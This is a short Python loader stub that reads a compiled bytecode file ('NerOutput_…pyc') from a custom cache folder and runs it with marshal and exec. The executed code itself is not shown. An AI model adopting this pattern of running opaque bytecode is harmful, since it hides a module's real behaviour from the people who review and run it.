
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'NerOutput_7adf81569bfb4fb992d13a166ef845b1.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
